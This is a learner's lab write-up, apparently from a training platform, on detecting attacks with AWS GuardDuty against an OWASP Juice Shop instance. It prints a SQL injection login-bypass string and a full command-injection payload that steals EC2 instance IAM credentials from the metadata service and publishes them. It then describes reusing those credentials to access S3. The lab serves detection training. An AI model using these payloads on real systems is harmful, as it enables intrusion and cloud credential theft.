# Threat Detection with GuardDuty

**Project Link:** [View Project](http://nextwork.ai/projects/aws-security-guardduty)

**Author:** Jude Anewuoh  
**Email:** judeanewuoh@gmail.com

---

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_v1w2x3y4)

---

## Introducing Today's Project!

### Tools and concepts

The key concepts I learnt in this project include:
1. Amazon GuardDuty
2. AWS CloudFormation

### Project reflection

This project took me approximately 2 hours. The most challenging part was following through to the end. The most rewarding part was the invaluable attack sequence and detection knowledge I learned.

I did this project because I wanted to enhance my detection skills with GuardDuty and this project delivered just that.

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches the resources needed to run the OWASP Juice Shop. The three main components were web infrastructure (EC2, VPC, CloudFront), an S3 bucket and GuardDuty.

The web app I deployed (OWASP Juice Shop) served as a target for web attacks. To practice my GuardDuty skills, I detected malicious attacks and attempts hitting the target.

GuardDuty is in this project because I used it to detect threats and malicious activities.

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_n1o2p3q4)

---

## SQL Injection

The first attack I performed on the web app was SQL injection, which means I acted as an attacker by sending a malicious request.

My SQL injection attack involved this query "' or 1=1;--" which had one goal: to manipulate the SQL query used for login to bypass authentication check.

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_h1i2j3k4)

---

## Command Injection

Next, I used command injection, which is a security vulnerability that lets an attacker run arbitrary operating system commands on a server. The Juice Shop web app is vulnerable to this because it accepts user input without validating or sanitising it.

To run command injection, I copied and pasted this script: #{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json').

This script executed and stored the stolen credentials.  



![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_t3u4v5w6)

---

## Attack Verification

To verify the attack's success, I verified it via the link the command instructed to place. The credentials page showed me access_id_key, secret_access_key and token.

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_x7y8z9a0)

---

## Using CloudShell for Advanced Attacks

I used CloudShell to execute the commands to access sensitive data in the S3 bucket. 

In CloudShell, I used wget command to download the credentials. Next, I ran a command using cat and jq to view the details in the downloaded file in json format.

I then set up a profile, called stolen, which stored the credentials I used to authenticate and access the S3 bucket as a hacker.

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_j9k0l1m2)

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding within a few seconds. The finding is "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS" with a HIGH severity tag.

GuardDuty's finding was called " UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS" which means unauthorized activity was detected where credentials assigned to an EC2 instance (i.e. web server of your web app) were used in a suspicious way.  

GuardDuty used anomaly detection to detect unusual use of EC2 instance's credentials.

GuardDuty's detailed finding reported on the resources affected, actions the hacker took and the IP address and location of hacker.

![Image](http://nextwork.ai/positive_beige_noble_river_dolphin/uploads/aws-security-guardduty_v1w2x3y4)

---

## Extra: Malware Protection

---
